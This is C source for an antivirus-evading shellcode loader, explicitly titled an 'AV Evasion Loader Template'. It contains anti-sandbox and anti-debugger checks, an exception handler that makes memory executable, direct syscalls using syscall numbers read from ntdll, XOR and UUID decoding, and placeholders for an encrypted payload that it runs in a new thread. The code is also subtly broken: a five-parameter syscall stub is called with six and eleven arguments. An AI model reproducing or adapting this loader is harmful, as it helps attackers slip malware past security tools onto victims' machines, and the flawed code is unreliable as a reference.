/*
 * AI AV Evasion Loader Template
 * 编译: x86_64-w64-mingw32-gcc -o payload.exe loader_final.c -mwindows -Os -static -s -lrpcrt4
 *  或:  cl.exe /MT /O2 /GS- loader_final.c /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup rpcrt4.lib
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <rpc.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "rpcrt4.lib")

/* ═══════════════════════════════════════════
 * 1. Anti-Sandbox / Anti-VM
 * ═══════════════════════════════════════════ */

static BOOL anti_sandbox_check(void) {
    /* Delay execution (sandboxes often timeout) */
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG)30000000);
    NtDelayExecution(FALSE, &delay);

    /* Physical memory check */
    MEMORYSTATUSEX mem = { .dwLength = sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    /* CPU cores */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 1) return TRUE;

    /* Sandbox files */
    const char* sandbox_files[] = {
        "C:\\agent\\agent.pyw",
        "C:\\analysis\\analysis.exe",
        "C:\\sandbox\\",
        NULL
    };
    for (int i = 0; sandbox_files[i]; i++) {
        if (GetFileAttributesA(sandbox_files[i]) != INVALID_FILE_ATTRIBUTES)
            return TRUE;
    }

    /* Debugger */
    if (IsDebuggerPresent()) return TRUE;

    /* Sandbox DLLs */
    const char* sandbox_dlls[] = {
        "sbiedll.dll", "dbghelp.dll", "api_log.dll",
        "dir_watch.dll", "pstorec.dll", "vmcheck.dll", "wpespy.dll",
        NULL
    };
    for (int i = 0; sandbox_dlls[i]; i++) {
        if (GetModuleHandleA(sandbox_dlls[i])) return TRUE;
    }
    return FALSE;
}

/* ═══════════════════════════════════════════
 * 2. VEH Memory Protection
 * ═══════════════════════════════════════════ */

static LONG WINAPI veh_handler(PEXCEPTION_POINTERS ex) {
    PEXCEPTION_RECORD rec = ex->ExceptionRecord;
    if (rec->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        DWORD old;
        VirtualProtect(rec->ExceptionAddress, 0x1000, PAGE_EXECUTE_READWRITE, &old);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (rec->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION) {
        ex->ContextRecord->Rip++;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* ═══════════════════════════════════════════
 * 3. Direct Syscall (dynamic syscall number extraction)
 * ═══════════════════════════════════════════ */

static DWORD get_syscall_number(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    BYTE* func = (BYTE*)GetProcAddress(ntdll, func_name);
    if (!func) return 0;
    for (int i = 0; i < 24; i++) {
        if (func[i] == 0xB8) return *(DWORD*)(func + i + 1);
    }
    return 0;
}

#if defined(_MSC_VER)
__declspec(naked) NTSTATUS do_syscall(DWORD num, ULONG_PTR a1, ULONG_PTR a2,
                                      ULONG_PTR a3, ULONG_PTR a4) {
    __asm {
        mov r10, rcx
        mov eax, edx
        mov rcx, r8
        mov rdx, r9
        mov r8,  [rsp+40]
        mov r9,  [rsp+48]
        syscall
        ret
    }
}
#else
__attribute__((naked)) NTSTATUS do_syscall(DWORD num, ULONG_PTR a1, ULONG_PTR a2,
                                            ULONG_PTR a3, ULONG_PTR a4) {
    __asm__ volatile(
        "mov %%rcx, %%r10\n\t"
        "mov %%edx, %%eax\n\t"
        "mov %%r8,  %%rcx\n\t"
        "mov %%r9,  %%rdx\n\t"
        "mov 0x28(%%rsp), %%r8\n\t"
        "mov 0x30(%%rsp), %%r9\n\t"
        "syscall\n\t"
        "ret"
    );
}
#endif

/* ═══════════════════════════════════════════
 * 4. XOR Decrypt
 * ═══════════════════════════════════════════ */

static void xor_decrypt(unsigned char* data, size_t len,
                        unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % key_len];
}

/* ═══════════════════════════════════════════
 * 5. UUID Deobfuscate
 * ═══════════════════════════════════════════ */

static void uuid_deobfuscate(char** uuids, size_t count,
                             unsigned char* out, size_t out_len) {
    size_t offset = 0;
    for (size_t i = 0; i < count && offset < out_len; i++) {
        UUID uuid;
        if (UuidFromStringA((RPC_CSTR)uuids[i], &uuid) != RPC_S_OK) continue;
        size_t n = 16;
        if (offset + n > out_len) n = out_len - offset;
        memcpy(out + offset, &uuid, n);
        offset += n;
    }
}

/* ═══════════════════════════════════════════
 * 6. Main
 * ═══════════════════════════════════════════ */

// $$SHELLCODE_PLACEHOLDER$$
// $$KEY_PLACEHOLDER$$

int main(void) {
    if (anti_sandbox_check()) return 0;

    AddVectoredExceptionHandler(1, veh_handler);

    /* Decrypt */
    xor_decrypt(encrypted_shellcode, encrypted_shellcode_len,
                decrypt_key, decrypt_key_len);

    /* Optional UUID deobfuscate: uncomment if using obfuscation */
    // $$UUID_PLACEHOLDER$$
    // unsigned char deobfuscated[8192] = {0};
    // uuid_deobfuscate(payload_uuid, payload_uuid_count,
    //                  deobfuscated, sizeof(deobfuscated));
    // xor_decrypt(deobfuscated, sizeof(deobfuscated),
    //             decrypt_key, decrypt_key_len);

    /* Syscall fallback */
    DWORD na = get_syscall_number("NtAllocateVirtualMemory");
    DWORD nw = get_syscall_number("NtWriteVirtualMemory");
    DWORD np = get_syscall_number("NtProtectVirtualMemory");
    DWORD nt = get_syscall_number("NtCreateThreadEx");
    DWORD ns = get_syscall_number("NtWaitForSingleObject");

    if (!na || !nw || !nt) {
        /* Standard API fallback */
        void* exec = VirtualAlloc(NULL, encrypted_shellcode_len,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(exec, encrypted_shellcode, encrypted_shellcode_len);
        DWORD old;
        VirtualProtect(exec, encrypted_shellcode_len, PAGE_EXECUTE_READ, &old);
        HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec,
                                 NULL, 0, NULL);
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
        return 0;
    }

    /* Direct syscall path */
    void* exec_mem = NULL;
    SIZE_T sz = encrypted_shellcode_len;
    do_syscall(na, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)&exec_mem, 0, (ULONG_PTR)&sz,
               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T written;
    do_syscall(nw, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)exec_mem, (ULONG_PTR)encrypted_shellcode,
               encrypted_shellcode_len, (ULONG_PTR)&written);

    DWORD old_prot;
    do_syscall(np, (ULONG_PTR)GetCurrentProcess(),
               (ULONG_PTR)&exec_mem, (ULONG_PTR)&sz,
               PAGE_EXECUTE_READ, (ULONG_PTR)&old_prot);

    HANDLE th;
    do_syscall(nt, (ULONG_PTR)&th, 0x1FFFFF, 0,
               (ULONG_PTR)GetCurrentProcess(), (ULONG_PTR)exec_mem,
               0, 0, 0, 0, 0);

    do_syscall(ns, (ULONG_PTR)th, 0, 0, 0);
    CloseHandle(th);
    return 0;
}
